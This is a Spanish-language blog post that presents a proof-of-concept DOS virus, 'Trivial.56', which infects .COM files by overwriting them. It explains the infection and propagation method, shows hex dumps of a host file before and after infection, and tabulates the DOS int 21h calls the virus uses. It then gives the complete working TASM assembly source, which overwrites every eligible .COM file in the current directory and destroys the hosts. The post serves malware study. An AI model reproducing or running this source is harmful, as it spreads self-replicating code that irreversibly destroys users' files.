---
categories: [Malware, Programación]
layout: post
published: true
tags: [16-bit, ASM-x86, DOS, PoC, TASM, Virus]
title: "Prueba de concepto - Virus: x86/DOS, COM, Overwriting"
toc: true
---
<style>
  pre.ovf span { color: #000; }
  pre.ovf span:first-of-type { line-height:200% }
  pre.ovf span.vs { color: #ff0000 }
</style>

Prueba de concepto de virus en la plataforma x86/DOS con estrategia de infección por 
overwriting (sobrescritura) en archivos COM. El virus infecta archivos en tiempo 
de ejecución.

## Método de infección
El virus simplemente sobrescribe otros archivos COM con el código viral. Es la estrategia
más primitiva, pero es muy agresiva y destructiva. Todas las generaciones del 
virus son idénticas.

  {% img infection.png | {"width":"350"} %}

Generalmente nada se preserva de los archivos huéspedes ya que son destruidos por la sobrescritura. 
La desinfección consiste en eliminar todos los archivos infectados.

## Método de propagación
La infección se realiza en el momento de ejecución infectando todos los archivos COM en el 
directorio actual a excepción de aquellos con atributo READ-ONLY, HIDDEN o SYSTEM.

## Flujo de ejecución

  {% img flow.png | {"width":"350"} %}

## Análisis estático
Hex dump de un archivo sano de tamaño 80 bytes:
<pre class="ovf">
<span>Offset  00 01 02 03 04 05 06 07  ANSI</span>
<span>0x0000</span>  <span>B4 09 BA 39 01 CD 21 90</span>  <span>´.º9.Í!.</span>
<span>0x0008</span>  <span>90 90 90 90 90 90 90 90</span>  <span>........</span>
<span>0x0010</span>  <span>90 90 90 90 90 90 90 90</span>  <span>........</span>
<span>0x0018</span>  <span>90 90 90 90 90 90 90 90</span>  <span>........</span>
<span>0x0020</span>  <span>90 90 90 90 90 90 90 90</span>  <span>........</span>
<span>0x0028</span>  <span>90 90 90 90 90 90 90 90</span>  <span>........</span>
<span>0x0030</span>  <span>90 90 90 90 90 B4 00 CD</span>  <span>.....´.Í</span>
<span>0x0038</span>  <span>21 54 68 69 73 20 69 73</span>  <span>!This is</span>
<span>0x0040</span>  <span>20 61 20 68 6F 73 74 20</span>  <span> a host </span>
<span>0x0048</span>  <span>66 69 6C 65 21 0D 0A 24</span>  <span>file!..$</span>
</pre>

Hex dump del archivo infectado:
<pre class="ovf">
<span>Offset  00 01 02 03 04 05 06 07  ANSI</span>
<span>0x0000</span>  <span class="vs">B4 4E 33 C9 BA 32 01 CD</span>  <span class="vs">´N3Éº2.Í</span>
<span>0x0008</span>  <span class="vs">21 73 08 EB 21 B4 4F CD</span>  <span class="vs">!s.ë!´OÍ</span>
<span>0x0010</span>  <span class="vs">21 72 1B B4 3D B0 02 BA</span>  <span class="vs">!r.´=°.º</span>
<span>0x0018</span>  <span class="vs">9E 00 CD 21 8B D8 B4 40</span>  <span class="vs">ž.Í!‹Ø´@</span>
<span>0x0020</span>  <span class="vs">B9 38 00 BA 00 01 CD 21</span>  <span class="vs">¹8.º..Í!</span>
<span>0x0028</span>  <span class="vs">B4 3E CD 21 EB DF B4 00</span>  <span class="vs">´>Í!ëß´.</span>
<span>0x0030</span>  <span class="vs">CD 21 2A 2E 63 6F 6D 00</span>  <span class="vs">Í!*.com.</span>
<span>0x0038</span>  <span>21 54 68 69 73 20 69 73</span>  <span>!This is</span>
<span>0x0040</span>  <span>20 61 20 68 6F 73 74 20</span>  <span> a host </span>
<span>0x0048</span>  <span>66 69 6C 65 21 0D 0A 24</span>  <span>file!..$</span>
</pre>

El virus sobrescribe desde el offset 0x0000 hasta 0x0037 (56 bytes). Lo único que se 
conserva del huésped es el código luego del offset 0x0037. Si el huésped fuera menor 
a 56 bytes no quedaría nada de el.

## API utilizada
Se utilizan 6 servicios de la DOS API mediante la interrupción de software 21h.
<div class="table-responsive">
<table class="table">
  <thead class="thead-light">
    <tr>
      <th>Servicio</th>
      <th>AH</th>
      <th>Parámetros</th>
      <th>Retorno</th>
      <th>Versión DOS</th>
    </tr>
  </thead>
  <tr>
    <td>Terminar programa</td>
    <td>00h</td>
    <td class="center">-</td>
    <td class="center">-</td>
    <td>1+</td>
  </tr>
  <tr>
    <td>Abrir archivo existente</td>
    <td>3Dh</td>
    <td>AL = modos de acceso e intercambio<br>DS:DX -&gt; nombre del archivo (ASCIZ)</td>
    <td>Éxito: CF = 0, AX = handle del archivo <br>Error: CF = 1, AX = código de error </td>
    <td>2+</td>
  </tr>
  <tr>
    <td>Cerrar archivo</td>
    <td>3Eh</td>
    <td>BX = handle del archivo</td>
    <td>Éxito: CF = 0, AX destruido <br>Error: CF = 1, AX = código de error</td>
    <td>2+</td>
  </tr>
  <tr>
    <td>Escribir en archivo <br>o dispositivo</td>
    <td>40h</td>
    <td>BX = handle del archivo <br>CX = nro. de bytes <br>DS:DX -&gt; datos a escribir</td>
    <td>Éxito: CF = 0, AX = nro. de bytes escritos <br>Error: CF = 1, AX = código de error</td>
    <td>2+</td>
  </tr>
  <tr>
    <td>Buscar el primer archivo <br>coincidente</td>
    <td>4Eh</td>
    <td>CX = máscara de atributos de archivo<br>DS:DX -&gt; nombre del archivo (ASCIZ)</td>
    <td>Éxito: CF = 0, resultado en DTA <br>Error: CF = 1, AX = código de error</td>
    <td>2+</td>
  </tr>
  <tr>
    <td>Buscar el siguiente archivo <br>coincidente</td>
    <td>4Fh</td>
    <td class="center">-</td>
    <td>Exito: CF = 0, resultado en DTA <br>Error: CF = 1, AX = código de error</td>
    <td>2+</td>
  </tr>
</table>
</div>

## Código fuente
{% highlight nasm linenos %}
;##############################################################################
;# Nombre:        virus://DOS/Trivial.56
;# Plataforma:    Intel x86
;# SO:            DOS v2.0+, Win32 (mediante NTVDM)
;# Lenguaje:      ASM x86-16 (sintaxis Intel)
;# Herramientas:  TASM v4.1, TLINK v7.1.30
;# Tipo:          Overwriting, Non-Resident, COM infector
;# Tamaño:        56 bytes
;# Propagación:   Acción directa sobre el directorio actual. 
;# Infección:     Sobrescritura de archivos COM (no READ-ONLY/HIDDEN/SYSTEM).
;# Residente:     No
;# Stealth:       No
;# Payload:       No
;##############################################################################

.8086  
.model tiny

assume cs:virus, ds:virus

virus segment byte public 'CODE'

    org     100h

start:    
    mov     ah, 4Eh               ; | AH = 4Eh 
    xor     cx, cx                ; | CX = 0, archivos normales
    lea     dx, search_str        ; | DS:DX -> "*.COM"
    int     21h                   ; |_DOS API - Buscar primer archivo

    jnc     infect_file           ; archivo encontrado
    jmp     exit                  ; no hay archivo

find_next:    
    mov     ah, 4Fh               ; | AH = 4Fh  
    int     21h                   ; |_DOS API - Buscar siguiente archivo 

    jc      exit                  ; no hay archivo

infect_file:    
    mov     ah, 3Dh               ; | AH = 3Dh 
    mov     al, 2                 ; | AL = 2, lectura y escritura
    mov     dx, 9Eh               ; | DS:DX -> DTA + 1Eh = 9Eh (FileName)
    int     21h                   ; |_DOS API - Abrir archivo existente

    mov     bx, ax                ; | BX = handle del archivo 
    mov     ah, 40h               ; | AH = 40h
    mov     cx, virus_size        ; | CX = tamaño del virus
    lea     dx, start             ; | DS:DX -> inicio del código viral
    int     21h                   ; |_DOS API - Escribir en archivo/dispositivo

    mov     ah, 3Eh               ; | AH = 3Eh 
    int     21h                   ; |_DOS API - Cerrar archivo

    jmp     find_next             ; buscar siguiente

exit:    
    mov     ah, 00h               ; | AH = 00h
    int     21h                   ; |_DOS API - Retornar a DOS

search_str    db   "*.com", 00h   ; nombre comodín de búsqueda
virus_size    equ  ($ - start)    ; tamaño del virus

virus ends
end start
{% endhighlight %}

## Casos reales
* La familia de virus *Trivial* en sistemas DOS se caracteriza por tener los 
  ejemplares de virus más pequeños. Por ejemplo, *DOS/Trivial.22* es un 
  virus de solo 22 bytes.
* El gusano *VBS/LoveLetter.A@mm* tiene como principal vector de propagación el
  envió masivo de e-mails. Al ejecutarse sobre escribe archivos de extensión 
  *.vbs*, *.vbe*, *.js*, *.css*, *.jpg*, *.txt*, *.html*, *.avi*, *.mp3*, 
  y muchos más. Fue notablemente exitoso en el 2000.

## Bibliografía
{% bibliography -q
   @*[key=Szor2005
   || key=Phalcon-Skism,
   || key=Williams1992] 
%} 